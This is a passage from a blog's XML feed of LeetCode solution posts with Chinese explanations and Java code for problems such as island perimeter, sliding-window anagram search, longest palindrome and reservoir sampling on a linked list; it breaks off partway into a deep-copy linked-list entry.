    </entry>
    
    <entry>
      <title><![CDATA[463. Island Perimeter]]></title>
      <url>/wiki/2017/10/10/Leetcode-463-Island-Perimeter/</url>
      <content type="html"><![CDATA[<p>You are given a map in form of a two-dimensional integer grid where 1 represents land and 0 represents water.</p>
<p>Grid cells are connected horizontally/vertically (not diagonally). The grid is completely surrounded by water, and there is exactly one island (i.e., one or more connected land cells).</p>
<p>The island doesn’t have “lakes” (water inside that isn’t connected to the water around the island). One cell is a square with side length 1. The grid is rectangular, width and height don’t exceed 100. Determine the perimeter of the island.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">[[0,1,0,0],</span><br><span class="line"> [1,1,1,0],</span><br><span class="line"> [0,1,0,0],</span><br><span class="line"> [1,1,0,0]]</span><br><span class="line"></span><br><span class="line">Output: 16</span><br><span class="line"></span><br><span class="line">Explanation: The perimeter is the 16 yellow stripes in the image below:</span><br></pre></td></tr></table></figure>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15416483139480.png?imageslim" alt=""></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最直接的方法是数一下组成岛的方块数，每个方块有四条边，检查一下方块的每条边是否和其他方块的边重合。如果重合则减去1。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">islandPerimeter</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (grid == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = grid.length, m = n &gt; <span class="number">0</span> ? grid[<span class="number">0</span>].length : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || m == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> perimeter = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                perimeter += <span class="number">4</span>;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span> &lt; n &amp;&amp; grid[i + <span class="number">1</span>][j] == <span class="number">1</span>) perimeter--;</span><br><span class="line">                <span class="keyword">if</span> (j + <span class="number">1</span> &lt; m &amp;&amp; grid[i][j + <span class="number">1</span>] == <span class="number">1</span>) perimeter--;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; grid[i - <span class="number">1</span>][j] == <span class="number">1</span>) perimeter--;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; <span class="number">0</span> &amp;&amp; grid[i][j - <span class="number">1</span>] == <span class="number">1</span>) perimeter--;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> perimeter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或者数一下每个方块的右边和下面的边是否重合，如果重合减去2，因为每次重合会有两个方块的边减去1。这样简化了一些，不用检查每个方块的上边和左边。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">islandPerimeter</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (grid == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = grid.length, m = n &gt; <span class="number">0</span> ? grid[<span class="number">0</span>].length : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || m == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> perimeter = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)</span><br><span class="line">            <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                perimeter += <span class="number">4</span>;</span><br><span class="line">                <span class="keyword">if</span> (i + <span class="number">1</span> &lt; n &amp;&amp; grid[i + <span class="number">1</span>][j] == <span class="number">1</span>) perimeter -= <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (j + <span class="number">1</span> &lt; m &amp;&amp; grid[i][j + <span class="number">1</span>] == <span class="number">1</span>) perimeter -= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> perimeter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[438. Find All Anagrams in a String]]></title>
      <url>/wiki/2017/10/10/Leetcode-438-Find-All-Anagrams-in-a-String/</url>
      <content type="html"><![CDATA[<p>Given a string <strong>s</strong> and a <strong>non-empty</strong> string <strong>p</strong>, find all the start indices of <strong>p</strong>‘s anagrams in <strong>s</strong>.</p>
<p>Strings consists of lowercase English letters only and the length of both strings <strong>s</strong> and <strong>p</strong> will not be larger than 20,100.</p>
<p>The order of output does not matter.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s: &quot;cbaebabacd&quot; p: &quot;abc&quot;</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[0, 6]</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">The substring with start index = 0 is &quot;cba&quot;, which is an anagram of &quot;abc&quot;.</span><br><span class="line">The substring with start index = 6 is &quot;bac&quot;, which is an anagram of &quot;abc&quot;.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">s: &quot;abab&quot; p: &quot;ab&quot;</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[0, 1, 2]</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">The substring with start index = 0 is &quot;ab&quot;, which is an anagram of &quot;ab&quot;.</span><br><span class="line">The substring with start index = 1 is &quot;ba&quot;, which is an anagram of &quot;ab&quot;.</span><br><span class="line">The substring with start index = 2 is &quot;ab&quot;, which is an anagram of &quot;ab&quot;.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目是LeetCode 242. Valid Anagram的延伸。前者只要判断字符串是否是变位词，这里需要寻找出变位词的位置。一个容易想到的办法就是依次从字符串s中取出与p长度相等的子字符串，然后判定该子字符串是否是变位词。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findAnagrams</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> slen = s.length(), plen = p.length();</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slen - plen + <span class="number">1</span>; i++)</span><br><span class="line">        <span class="keyword">if</span> (isAnagram(p, s.substring(i, i + plen))) list.add(i);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">isAnagram</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">        count[s.charAt(i) - <span class="string">'a'</span>]++;</span><br><span class="line">        count[t.charAt(i) - <span class="string">'a'</span>]--;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count.length; i++) </span><br><span class="line">        <span class="keyword">if</span> (count[i] != <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是这种方法的时间复杂度不是很理想。一种被广泛应用在子字符串算法的滑动窗口方法能够很好的降低复杂度：它的基本思想是维持一个哈希表，哈希表的键值分别为字符和字符出现的次数；另外有begin，end指针分别表示滑动窗口的起始点和终点位置。哈希表中的值，也就是字符次数，初始化为变位词中各个字符出现的次数。遍历字符串，当出现变位词的字符时，哈希表中相应的值减去1，当哈希表中的值都为0时，说明滑动窗口内的子字符串很可能是变位词，如果此时起始点和终点的距离end-begin恰好为变位词的长度时，说明滑动窗口内肯定是变位词，记录下此时变位词的位置。然后调整滑动窗口的位置，寻找下一个变位词。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findAnagrams</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//init a collection or int value to save the result according the question.</span></span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span>(p.length() &gt; s.length()) <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a hashmap to save the Characters of the target substring.</span></span><br><span class="line">    <span class="comment">// (K, V) = (Character, Frequence of the Characters)</span></span><br><span class="line">    Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">char</span> c : p.toCharArray())</span><br><span class="line">        map.put(c, map.getOrDefault(c, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//maintain a counter to check whether match the target string.</span></span><br><span class="line">    <span class="comment">//must be the map size, NOT the string size because the char may be duplicate.</span></span><br><span class="line">    <span class="keyword">int</span> counter = map.size();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Two Pointers: begin - left pointer of the window; end - right pointer of the window</span></span><br><span class="line">    <span class="keyword">int</span> begin = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//loop at the beginning of the source string</span></span><br><span class="line">    <span class="keyword">while</span>(end &lt; s.length())&#123;</span><br><span class="line">        <span class="comment">//get a character</span></span><br><span class="line">        <span class="keyword">char</span> c = s.charAt(end);</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(c))&#123;</span><br><span class="line">            <span class="comment">// plus or minus one</span></span><br><span class="line">            map.put(c, map.get(c)-<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// modify the counter according the requirement(different condition).</span></span><br><span class="line">            <span class="keyword">if</span> (map.get(c) == <span class="number">0</span>) counter--;</span><br><span class="line">        &#125;</span><br><span class="line">        end++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//increase begin pointer to make it invalid/valid again</span></span><br><span class="line">        <span class="keyword">while</span>(counter == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// ***be careful here: choose the char at begin pointer, NOT the end pointer</span></span><br><span class="line">            <span class="keyword">char</span> tempc = s.charAt(begin);</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(tempc))&#123;</span><br><span class="line">                <span class="comment">//plus or minus one</span></span><br><span class="line">                map.put(tempc, map.get(tempc) + <span class="number">1</span>);</span><br><span class="line">                <span class="comment">//modify the counter according the requirement(different condition).</span></span><br><span class="line">                <span class="keyword">if</span> (map.get(tempc) &gt; <span class="number">0</span>) counter++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// save / update(min/max) the result if find a target</span></span><br><span class="line">            <span class="comment">// result collections or result int value</span></span><br><span class="line">            <span class="keyword">if</span> (end - begin == p.length())</span><br><span class="line">                result.add(begin);</span><br><span class="line">            begin++;</span><br><span class="line">        &#125; <span class="comment">//end while</span></span><br><span class="line">    &#125; <span class="comment">// end while</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125; <span class="comment">// end findAnagrams</span></span><br></pre></td></tr></table></figure>
<p>但是这种做法还是稍显麻烦，毕竟这里变位词只是26个字母，而且还都是小写的，真的没有必要用HashMap来做哈希表，用一个长26的整形数组来做哈希表更加好。注意下面的counter是变位词长度，不是上面的出现次数，所以代码简洁了一些。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findAnagrams</span><span class="params">(String s, String p)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (p.length() &gt; s.length()) <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// total number of character in p to be contained in s</span></span><br><span class="line">    <span class="keyword">int</span> counter = p.length();</span><br><span class="line">    <span class="comment">// calculate the number of each character to be contained in S</span></span><br><span class="line">    <span class="keyword">int</span>[] map = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c : p.toCharArray()) map[c - <span class="string">'a'</span>]++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// the begin/end of the sliding window</span></span><br><span class="line">    <span class="keyword">int</span> begin = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// current char</span></span><br><span class="line">    <span class="keyword">int</span> cur;</span><br><span class="line">    <span class="keyword">while</span> (end &lt; s.length()) &#123;</span><br><span class="line">        <span class="comment">// current char</span></span><br><span class="line">        cur = s.charAt(end++) - <span class="string">'a'</span>;</span><br><span class="line">        <span class="comment">// if the character needs to be contained, include it and minus the counter</span></span><br><span class="line">        <span class="keyword">if</span> (map[cur] &gt; <span class="number">0</span>) counter--;</span><br><span class="line">        map[cur]--;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// all included, move the begin pointer to minimize the window</span></span><br><span class="line">        <span class="keyword">while</span> (counter == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// current char</span></span><br><span class="line">            cur = s.charAt(begin) - <span class="string">'a'</span>;</span><br><span class="line">            <span class="comment">// current window contains same number of the current character as in p,</span></span><br><span class="line">            <span class="comment">// cannot move forward anymore</span></span><br><span class="line">            <span class="keyword">if</span> (map[cur] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// if the window size is same as p, an anagram is found</span></span><br><span class="line">                <span class="keyword">if</span> (end - begin == p.length()) res.add(begin);</span><br><span class="line">                counter++;</span><br><span class="line">            &#125; <span class="comment">// end if</span></span><br><span class="line">            map[cur]++;</span><br><span class="line">            begin++;</span><br><span class="line">        &#125; <span class="comment">// end while</span></span><br><span class="line">    &#125; <span class="comment">// end while</span></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="comment">// end findAnagrams</span></span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[409. Longest Palindrome]]></title>
      <url>/wiki/2017/10/10/Leetcode-409-Longest-Palindrome/</url>
      <content type="html"><![CDATA[<p>Given a string which consists of lowercase or uppercase letters, find the length of the longest palindromes that can be built with those letters.</p>
<p>This is case sensitive, for example <code>&quot;Aa&quot;</code> is not considered a palindrome here.</p>
<p><strong>Note</strong>:<br>Assume the length of given string will not exceed 1,010.</p>
<p><strong>Example</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line">&quot;abccccdd&quot;</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">7</span><br><span class="line"></span><br><span class="line">Explanation:</span><br><span class="line">One longest palindrome that can be built is &quot;dccaccd&quot;, whose length is 7.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最长回文。使用哈希表存储，这里由于存储对象是字母，所以可以用长128的数组存储(ascii表长度为128)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestPalindrome</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> [] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">char</span> c: s.toCharArray())</span><br><span class="line">        count[c]++;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">128</span>; i++)</span><br><span class="line">        res += count[i]/<span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    res *= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (res &lt; s.length()) res++;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[382. Linked List Random Node]]></title>
      <url>/wiki/2017/10/10/Leetcode-382-Linked-List-Random-Node/</url>
      <content type="html"><![CDATA[<p>Given a singly linked list, return a random node’s value from the linked list. Each node must have the <strong>same probability</strong> of being chosen.</p>
<p><strong>Follow up</strong>:<br>What if the linked list is extremely large and its length is unknown to you? Could you solve this efficiently without using extra space?</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Init a singly linked list [1,2,3].</span><br><span class="line">ListNode head = new ListNode(1);</span><br><span class="line">head.next = new ListNode(2);</span><br><span class="line">head.next.next = new ListNode(3);</span><br><span class="line">Solution solution = new Solution(head);</span><br><span class="line"></span><br><span class="line">// getRandom() should return either 1, 2, or 3 randomly. </span><br><span class="line">// Each element should have equal probability of returning.</span><br><span class="line">solution.getRandom();</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目比较直接，也是最平常的想法，就是每次调用<code>getRandom()</code>产生一个随机数，随机数的范围在[0, len]之间，其中len是链表的长度。这样就保证了产生的随机数是随机的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ListNode head;</span><br><span class="line"><span class="keyword">private</span> Random random;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@param</span> head The linked list's head.</span></span><br><span class="line"><span class="comment">    Note that the head is guaranteed to be not null, so it contains at least one node. */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Solution</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = head;       </span><br><span class="line">    random = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">for</span> (len = <span class="number">0</span>; head != <span class="keyword">null</span>; len++)</span><br><span class="line">        head = head.next;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/** Returns a random node's value. */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRandom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> index = random.nextInt(len);</span><br><span class="line">    ListNode cur = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">        cur = cur.next;</span><br><span class="line">    <span class="keyword">return</span> cur.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但题目里又说了，如果数据量非常大怎么办？上面的解法中有个缺陷，那就是调用一次<code>getRandom()</code>要遍历两遍链表，这在数据量大的时候非常不适合。那么有没有可能只要遍历一次链表就能得到一个随机的链表节点值呢？当然有，水塘抽样算法！</p>
<p><a href="http://larryim.cc/wiki/2017/10/10/Algorithm-水塘抽样/">水塘抽样算法</a>，其目的在于从包含$n$个项目的集合S中选取$k$个样本，其中$n$为一很大或未知的数量，尤其适用于不能把所有$n$个项目都存放到主内存的情况。这里是水塘抽样算法的特例，$k=1$。其基本思路如下：</p>
<ol>
<li>初始化结果为head：result = head.val</li>
<li>初始化 $i = 2$</li>
<li>现在从第二个节点向前依次考虑每个节点<ul>
<li>产生0到$i-1$的随机数$j$</li>
<li>如果$j$等于0(或者其他固定的从0到$n-1$的数，将结果取代为现在节点的值</li>
<li>$i = i + 1$</li>
<li>current = current-&gt;next</li>
</ul>
</li>
</ol>
<p>具体Java代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ListNode head;</span><br><span class="line"><span class="keyword">private</span> Random random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** <span class="doctag">@param</span> head The linked list's head.</span></span><br><span class="line"><span class="comment">    Note that the head is guaranteed to be not null, so it contains at least one node. */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Solution</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.head = head;       </span><br><span class="line">    random = <span class="keyword">new</span> Random();  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Returns a random node's value. */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getRandom</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ListNode head = <span class="keyword">this</span>.head;</span><br><span class="line">    <span class="keyword">int</span> res = head.val;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; head.next != <span class="keyword">null</span>; i++) &#123;</span><br><span class="line">        head = head.next;</span><br><span class="line">        <span class="keyword">if</span>(random.nextInt(i) == <span class="number">0</span>) res = head.val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Reservoir Sampling </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[138. Copy List with Random Pointer]]></title>
      <url>/wiki/2017/10/10/Leetcode-138-Copy-List-with-Random-Pointer/</url>
      <content type="html"><![CDATA[<p>A linked list is given such that each node contains an additional random pointer which could point to any node in the list or null.</p>
<p>Return a deep copy of the list.</p>
<p>Definition for singly-linked list with a random pointer.</p>
